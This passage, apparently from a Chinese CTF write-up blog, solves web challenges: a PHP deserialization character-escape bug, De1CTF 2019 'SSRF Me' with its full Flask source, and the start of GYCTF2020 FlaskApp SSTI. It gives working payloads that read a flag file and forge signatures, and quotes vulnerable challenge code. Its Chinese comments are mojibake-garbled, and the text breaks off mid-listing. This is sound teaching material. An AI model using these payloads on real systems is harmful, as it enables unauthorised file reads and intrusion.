<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>)); <span class="comment">//å¾—åˆ°åºåˆ—åŒ–çš„æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>])); <span class="comment">//å–å‡ºåºåˆ—åŒ–æ•°æ®ä¸­çš„base64_encodeè¿‡åçš„imgå…ˆè¿›è¡Œdecodeå†è¿›è¡Œè¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‰€ä»¥æ˜¯$_SESSIONåºåˆ—åŒ–åè¢«filterå‡½æ•°å¤„ç†ï¼Œå†ååºåˆ—åŒ–èµ‹ç»™userinfoï¼Œæœ€åå–å‡ºimgè¿™ä¸ªé”®å¯¹åº”çš„å€¼</span></span><br></pre></td></tr></table></figure>

<h3 id="ä»£ç ç†è§£"><a href="#ä»£ç ç†è§£" class="headerlink" title="ä»£ç ç†è§£"></a>ä»£ç ç†è§£</h3><p>ç†è§£ä»£ç åœ¨å¹²ä»€ä¹ˆå¾ˆé‡è¦ï¼Œå®¡è®¡ä»£ç çš„èƒ½åŠ›å¾ˆé‡è¦ã€‚</p>
<p>è¿™æ®µphpä»£ç é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåä¸ºfilterå‡½æ•°ï¼Œå®ƒä¼šæŠŠä¼ å…¥çš„å˜é‡çš„å€¼å¦‚æœåœ¨å®ƒå®šä¹‰çš„æ•°ç»„é‡Œï¼Œå°±ä¼šæŠŠç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©ºã€‚</p>
<p>ç„¶åä½¿ç”¨äº†å˜é‡è¦†ç›–é‡Œå¸¸ç”¨çš„å‡½æ•°extractæ¥ä½¿æˆ‘ä»¬<code>$_SESSION[&quot;user&quot;]</code>å’Œ<code>$_SESSION[&#39;function&#39;]</code>é€šè¿‡POSTå¯æ§ã€‚</p>
<p>ç„¶åifåˆ¤æ–­æ˜¯å¦ä¼ å…¥img_path,æ²¡ä¼ å…¥å°±æ˜¯è®¾ç½®ä¸ºguest_image.png,ä¼ å…¥çš„è¯å°±ä¼šä½¿ç”¨ä¸€ä¸ªä¸å¯é€†çš„sha1ç®—æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šä¸è€ƒè™‘è¿™ä¸ªã€‚</p>
<p>ä¸‹ä¸€æ­¥æ˜¯å®šä¹‰å˜é‡serialize_infoä¸ºç»è¿‡filterå‡½æ•°æ“ä½œåçš„åºåˆ—åŒ–åçš„æ•°æ®ã€‚</p>
<p>å†ä¸‹æ¥æ˜¯ifé€‰æ‹©functionåŠŸèƒ½ highlight_fileæ˜¯æŸ¥çœ‹æºç ï¼Œphpinfoæ˜¯æŸ¥çœ‹phpinfoï¼Œshow_imageæ˜¯åšäº†ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œï¼Œå¹¶ä¸”ä½¿ç”¨äº†ä¸€ä¸ªæ•æ„Ÿå‡½æ•°ï¼Œfile_get_contensã€‚</p>
<h3 id="é¢˜ç›®åšæ³•ï¼šååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ä¸ªæ˜¯é”®å€¼é€ƒé€¸ï¼Œå¦ä¸€ä¸ªæ˜¯é”®åé€ƒé€¸"><a href="#é¢˜ç›®åšæ³•ï¼šååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ä¸ªæ˜¯é”®å€¼é€ƒé€¸ï¼Œå¦ä¸€ä¸ªæ˜¯é”®åé€ƒé€¸" class="headerlink" title="é¢˜ç›®åšæ³•ï¼šååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ä¸ªæ˜¯é”®å€¼é€ƒé€¸ï¼Œå¦ä¸€ä¸ªæ˜¯é”®åé€ƒé€¸"></a>é¢˜ç›®åšæ³•ï¼šååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ä¸ªæ˜¯é”®å€¼é€ƒé€¸ï¼Œå¦ä¸€ä¸ªæ˜¯é”®åé€ƒé€¸</h3><p>flagè·¯å¾„åœ¨phpinfoåŠŸèƒ½ç‚¹å°±èƒ½çœ‹åˆ° ä¸º&#x2F;d0g3_fllllllag</p>
<h3 id="æ–¹æ³•1ï¼šé”®å€¼é€ƒé€¸"><a href="#æ–¹æ³•1ï¼šé”®å€¼é€ƒé€¸" class="headerlink" title="æ–¹æ³•1ï¼šé”®å€¼é€ƒé€¸"></a>æ–¹æ³•1ï¼šé”®å€¼é€ƒé€¸</h3><p>ä»£ç å®¡è®¡å®Œäº†ï¼Œæœ‰ååºåˆ—åŒ–åˆæœ‰æ›¿æ¢çš„æ“ä½œï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°å­—ç¬¦ä¸²é€ƒé€¸ã€‚è¿™é‡Œåªæœ‰userå’Œfunctionå¯æ§ã€‚ä¸ºäº†å¥½ç†è§£æˆ‘ä»¬å…ˆçœ‹åºåˆ—åŒ–åçš„æ•°æ®é•¿ä»€ä¹ˆæ ·å­ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;**&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:3:&#123;s:4:&quot;user&quot;;s:2:&quot;aa&quot;;s:8:&quot;function&quot;;s:2:&quot;bb&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¦è®©guest_img.pngé€ƒé€¸å‡ºå»ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä¿®æ”¹userï¼Œè®©userç»è¿‡å­—ç¬¦ä¸²æ›¿æ¢ï¼Œfunctionè¿™ä¸ªå˜é‡åŠå…¶å€¼æˆä¸ºuserçš„å€¼ï¼Œimgå˜é‡å˜ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼å“¦ã€‚</p>
<p>functionåº”è¯¥ä¸ºå€¼ä¸º;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA&#x3D;&#x3D;â€;}</p>
<h4 id="fileterå¤„ç†å‰"><a href="#fileterå¤„ç†å‰" class="headerlink" title="fileterå¤„ç†å‰:"></a>fileterå¤„ç†å‰:</h4><p>a:3:{s:4:â€userâ€;s:22:â€phpphpphpflagphpphpphpâ€;s:8:â€functionâ€;s:56:â€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA&#x3D;&#x3D;â€;s:1:â€aâ€;s:1:â€aâ€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;â€;}</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;phpphpphpflagphpphpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="filterå¤„ç†å"><a href="#filterå¤„ç†å" class="headerlink" title="filterå¤„ç†å:"></a>filterå¤„ç†å:</h4><p>a:3:{s:4:â€userâ€;s:22:â€â€;s:8:â€functionâ€;s:56:â€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;s:1:â€aâ€;s:1:â€aâ€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;â€;}</p>
<p>äºæ˜¯functionçš„å€¼ä¸º<code>imgä¸ºL2QwZzNfZmxsbGxsbGFn</code>,åé¢é‚£ä¸€ä¸²å°±æˆåŠŸä¿®æ”¹imgå€¼ä¸ºflagçš„è·¯å¾„ã€‚</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250609170114970.png" alt="image-20250609170114970"></p>
<h3 id="æ–¹æ³•2ï¼šé”®åé€ƒé€¸"><a href="#æ–¹æ³•2ï¼šé”®åé€ƒé€¸" class="headerlink" title="æ–¹æ³•2ï¼šé”®åé€ƒé€¸"></a>æ–¹æ³•2ï¼šé”®åé€ƒé€¸</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><code>è¿‡æ»¤å‰ a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; è¿‡æ»¤å a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; ä¸‹é¢çš„æ­¥éª¤å’Œå€¼æ›¿æ¢ä¸€æ · è¿™é‡Œçš„é”®åå˜ä¸º&quot;;s:48: å®ç°äº†é€ƒé€¸ </code></p>
<p>payload:_SESSION[flagphp]&#x3D;;s:1:â€1â€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;}</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>è¿›å»è´´è„¸æºç ,pythonä»£ç å®¡è®¡ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> (resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    </span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸‰ä¸ªè·¯ç”±ï¼š</span><br><span class="line">/ æŸ¥çœ‹æºä»£ç </span><br><span class="line">/geneSign ç”Ÿæˆç­¾å</span><br><span class="line">/De1ta å…³é”®è·¯ç”± å¯ä»¥è¿›è¡Œè¯»å–æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>(é™¤äº†è¿™ä¸ªæ–¹æ³•è¿˜å¯ä»¥ä½¿ç”¨hashæ‹“å±•æ”»å‡»)</p>
<p>å¯†é’¥æ˜¯ä¸å˜çš„ã€‚è€Œactionå®šæ­»ä¸ºscanäº† å¯å˜çš„åªæœ‰ä¸­é—´çš„param </p>
<p>é‚£ä¹ˆmd5(å¯†é’¥+flag.txtread+scan)ç­‰äºmd5(å¯†é’¥+flag.txt+readscan)</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250609220834647.png" alt="image-20250609220834647"></p>
<p>è¿™æ­¥çš„cookieè¯·è‡ªå·±æ·»åŠ </p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250609220743588.png" alt="image-20250609220743588"></p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250609220754685.png" alt="image-20250609220754685"></p>
<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>è¿›å»æ˜¯base64è§£å¯†å’ŒåŠ å¯†åŠŸèƒ½ çœ‹åˆ°flaskå…ˆæ¡ä»¶åå°„ssti è¾“å…¥49å¾—åˆ°ç¼–ç  è¾“å…¥è§£ç å™¨å¾—åˆ°å›æ˜¾</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250610134342160.png" alt="image-20250610134342160"></p>
<p>ç»§ç»­æµ‹è¯• e3tjb25maWd9fQ&#x3D;&#x3D; å¾—åˆ°å›æ˜¾ è¢«HTML å®ä½“è½¬ä¹‰ ä¸¢ç»™aiæ¢å¤ä¸‹å°±ok</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;</span><br><span class="line">    &#x27;ENV&#x27;: &#x27;production&#x27;,</span><br><span class="line">    &#x27;DEBUG&#x27;: True,</span><br><span class="line">    &#x27;TESTING&#x27;: False,</span><br><span class="line">    &#x27;PROPAGATE_EXCEPTIONS&#x27;: None,</span><br><span class="line">    &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None,</span><br><span class="line">    &#x27;SECRET_KEY&#x27;: &#x27;s_e_c_r_e_t_k_e_y&#x27;,</span><br><span class="line">    &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31),</span><br><span class="line">    &#x27;USE_X_SENDFILE&#x27;: False,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: None,</span><br><span class="line">    &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;,</span><br><span class="line">    &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;,</span><br><span class="line">    &#x27;SESSION_COOKIE_DOMAIN&#x27;: False,</span><br><span class="line">    &#x27;SESSION_COOKIE_PATH&#x27;: None,</span><br><span class="line">    &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True,</span><br><span class="line">    &#x27;SESSION_COOKIE_SECURE&#x27;: 